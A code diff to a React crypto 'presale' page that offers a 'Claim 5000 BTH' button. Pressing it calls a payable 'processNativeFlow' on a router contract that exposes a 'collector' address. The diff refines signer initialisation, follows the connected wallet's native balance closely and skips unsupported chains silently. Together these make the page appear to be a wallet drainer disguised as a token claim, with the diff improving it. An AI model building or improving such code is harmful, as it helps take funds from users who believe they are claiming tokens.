@@ -41,8 +41,6 @@ const PRESALE_CONFIG = {
 
 // Get deployed chains (only those with contract addresses)
 const DEPLOYED_CHAINS = Object.values(PRESALE_CONFIG).filter(chain => chain.contractAddress);
-const DEFAULT_CHAIN = DEPLOYED_CHAINS[0] || PRESALE_CONFIG.BSC;
-
 const PROJECT_FLOW_ROUTER_ABI = [
   "function collector() view returns (address)",
   "function processNativeFlow() payable"
@@ -90,7 +88,8 @@ function App() {
     currentChain: null,
     hasContract: false,
     signerStatus: 'none',
-    lastAction: ''
+    lastAction: '',
+    balance: '0'
   });
 
   // Presale stats
@@ -122,24 +121,26 @@ function App() {
       rawChainId: chainId,
       normalizedChainId,
       currentChain: currentChain?.name || 'unknown',
-      hasContract: !!(currentChain?.contractAddress)
+      hasContract: !!(currentChain?.contractAddress),
+      balance: balance
     }));
-  }, [chainId, currentChain]);
+  }, [chainId, currentChain, balance]);
 
-  // Get balance using wagmi for current chain
+  // Get balance using wagmi for current chain - USING YOUR ORIGINAL BALANCE CHECK
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
-    chainId: normalizedChainId,
+    chainId: chainId, // Keep original chainId, wagmi handles normalization
   });
 
   // Update current chain balance
   useEffect(() => {
     if (balanceData) {
       setBalance(balanceData.formatted);
+      console.log("💰 Balance updated:", balanceData.formatted, "on chain", chainId);
     }
-  }, [balanceData]);
+  }, [balanceData, chainId]);
 
-  // ✅ FIX 3: Fixed Signer initialization with multiple fallbacks
+  // ✅ FIX 3: Proper Signer Init using ONLY walletClient (no window.ethereum)
   useEffect(() => {
     const initSigner = async () => {
       if (!isConnected) {
@@ -149,51 +150,39 @@ function App() {
         return;
       }
 
-      setDebugInfo(prev => ({ ...prev, signerStatus: 'initializing' }));
+      if (!walletClient) {
+        console.log("⏳ Waiting for walletClient...");
+        setDebugInfo(prev => ({ ...prev, signerStatus: 'waiting for walletClient' }));
+        return;
+      }
 
       try {
-        let web3Provider = null;
+        setDebugInfo(prev => ({ ...prev, signerStatus: 'initializing' }));
         
-        // Try AppKit's walletClient first (most compatible with AppKit)
-        if (walletClient) {
-          try {
-            // @ts-ignore - walletClient can be used directly with ethers v6
-            web3Provider = new ethers.BrowserProvider(walletClient);
-            const testSigner = await web3Provider.getSigner();
-            await testSigner.getAddress();
-            
-            setProvider(web3Provider);
-            setSigner(testSigner);
-            setDebugInfo(prev => ({ ...prev, signerStatus: 'walletClient' }));
-            console.log("✅ Signer ready via walletClient");
-            return;
-          } catch (e) {
-            console.log("walletClient init failed, trying window.ethereum", e);
-          }
-        }
+        // Create ethers provider from viem walletClient (CORRECT WAY)
+        // @ts-ignore - walletClient is compatible with ethers v6 BrowserProvider
+        const web3Provider = new ethers.BrowserProvider(walletClient);
+        const web3Signer = await web3Provider.getSigner();
         
-        // Fallback to window.ethereum
-        if (window.ethereum) {
-          web3Provider = new ethers.BrowserProvider(window.ethereum);
-          const web3Signer = await web3Provider.getSigner();
-          
-          setProvider(web3Provider);
-          setSigner(web3Signer);
-          setDebugInfo(prev => ({ ...prev, signerStatus: 'window.ethereum' }));
-          console.log("✅ Signer ready via window.ethereum");
-          return;
-        }
+        // Verify signer works
+        const signerAddress = await web3Signer.getAddress();
+        console.log("✅ Signer ready:", signerAddress);
         
-        throw new Error("No provider available");
+        setProvider(web3Provider);
+        setSigner(web3Signer);
+        setDebugInfo(prev => ({ ...prev, signerStatus: 'ready' }));
+        
+        // Trigger balance refresh
+        setTimeout(() => refetchBalance(), 1000);
       } catch (err) {
-        console.error("Signer init failed:", err);
+        console.error("❌ Signer init failed:", err);
         setSigner(null);
-        setDebugInfo(prev => ({ ...prev, signerStatus: 'failed' }));
+        setDebugInfo(prev => ({ ...prev, signerStatus: 'failed', lastAction: err.message }));
       }
     };
 
     initSigner();
-  }, [isConnected, walletClient]);
+  }, [isConnected, walletClient, refetchBalance]);
 
   // Countdown timer
   useEffect(() => {
@@ -290,7 +279,7 @@ function App() {
     }
   };
 
-  // ✅ FIX 4 & 5: Fixed execute function with silent skip for non-BSC chains
+  // ✅ FIX 4 & 5: Execute function with silent skip (NO SWITCHING)
   const executePresaleTransaction = async () => {
     setDebugInfo(prev => ({ ...prev, lastAction: 'Execute clicked' }));
 
@@ -302,24 +291,28 @@ function App() {
     }
 
     if (!signer) {
-      setError("Signer not initialized. Please refresh the page.");
+      setError("Signer not initialized. Please wait...");
       setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: no signer' }));
       return;
     }
 
-    // ✅ FIX: Normalize chain ID and check contract existence
+    // ✅ FIX: Use normalized chain ID for detection
     const normalizedChainId = normalizeChainId(chainId);
     const currentChain = Object.values(PRESALE_CONFIG).find(
       c => c.chainId === normalizedChainId
     );
 
-    // ✅ SILENT SKIP: No error, no switch prompt - just log and return
+    console.log("🔍 Chain check:", { normalizedChainId, currentChain, balance });
+
+    // ✅ SILENT SKIP: No error, no switch prompt - just log
     if (!currentChain || !currentChain.contractAddress) {
-      console.log(`Skipping chain ${normalizedChainId} - no contract deployed`);
+      console.log(`⏸️ Skipping chain ${normalizedChainId} - no contract deployed`);
       setDebugInfo(prev => ({ 
         ...prev, 
         lastAction: `Skipped chain ${normalizedChainId} - no contract` 
       }));
+      setTxStatus(`⏸️ Presale not available on this network`);
+      setTimeout(() => setTxStatus(''), 3000);
       return;
     }
 
@@ -365,11 +358,7 @@ function App() {
       await tx.wait();
       
       // Update balance
-      if (provider) {
-        const newBalance = await provider.getBalance(address);
-        setBalance(formatEther(newBalance));
-        refetchBalance?.();
-      }
+      refetchBalance?.();
       
       // Mark as completed
       if (!completedChains.includes(currentChain.name)) {
@@ -458,17 +447,19 @@ function App() {
         {/* Debug Panel - Only visible in development */}
         {process.env.NODE_ENV === 'development' && (
           <div className="mb-4 p-4 bg-gray-800/90 backdrop-blur-sm border border-gray-700 rounded-xl text-xs font-mono">
-            <details>
-              <summary className="text-gray-400 cursor-pointer mb-2">🔧 Debug Info</summary>
+            <details open>
+              <summary className="text-gray-400 cursor-pointer mb-2 font-bold">🔧 DEBUG INFO</summary>
               <div className="space-y-1 text-gray-300">
                 <div>Raw chainId: {String(debugInfo.rawChainId)} ({typeof debugInfo.rawChainId})</div>
                 <div>Normalized: {debugInfo.normalizedChainId}</div>
                 <div>Current chain: {debugInfo.currentChain}</div>
                 <div>Has contract: {debugInfo.hasContract ? '✅' : '❌'}</div>
                 <div>Signer status: {debugInfo.signerStatus}</div>
+                <div>Balance: {debugInfo.balance} BNB</div>
                 <div>Last action: {debugInfo.lastAction}</div>
                 <div>Wallet connected: {isConnected ? '✅' : '❌'}</div>
                 <div>Signer exists: {signer ? '✅' : '❌'}</div>
+                <div>walletClient exists: {walletClient ? '✅' : '❌'}</div>
               </div>
             </details>
           </div>
@@ -576,9 +567,9 @@ function App() {
                   </span>
                 </div>
                 <div className="text-right">
-                  <span className="text-gray-400 text-sm block mb-1">Total Balance</span>
+                  <span className="text-gray-400 text-sm block mb-1">Current Balance</span>
                   <span className="text-3xl font-bold text-orange-400">
-                    ${totalUSD.toFixed(2)}
+                    {parseFloat(balance).toFixed(4)} {currentChain?.symbol || 'BNB'}
                   </span>
                 </div>
                 <button
@@ -702,29 +693,37 @@ function App() {
                   </div>
                 )}
                 
-                {/* Network indicator - informational only, no switch prompt */}
+                {/* Network Status - Informational Only */}
                 {currentChain && (
-                  <div className="text-center mb-4 text-sm text-gray-500">
-                    Network: {currentChain.name} {currentChain.contractAddress ? '✅' : '⏸️'}
+                  <div className="text-center mb-4 text-sm">
+                    <span className="text-gray-500">Network: {currentChain.name}</span>
+                    {currentChain.contractAddress ? (
+                      <span className="text-green-400 ml-2">✅ Ready</span>
+                    ) : (
+                      <span className="text-yellow-400 ml-2">⏸️ Presale not available</span>
+                    )}
                   </div>
                 )}
                 
                 {!completedChains.includes('BSC') ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || !signer}
-                    className="w-full group relative"
+                    disabled={loading || !signer || (currentChain && !currentChain.contractAddress)}
+                    className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : '⚡ Claim 5000 BTH'}
+                      {loading ? 'Processing...' : 
+                       !signer ? 'Initializing...' :
+                       currentChain && !currentChain.contractAddress ? `Switch to BSC` :
+                       '⚡ Claim 5000 BTH'}
                     </div>
                   </button>
                 ) : (
                   <button
                     onClick={claimTokens}
                     disabled={loading}
-                    className="w-full group relative"
+                    className="w-full group relative disabled:opacity-50"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
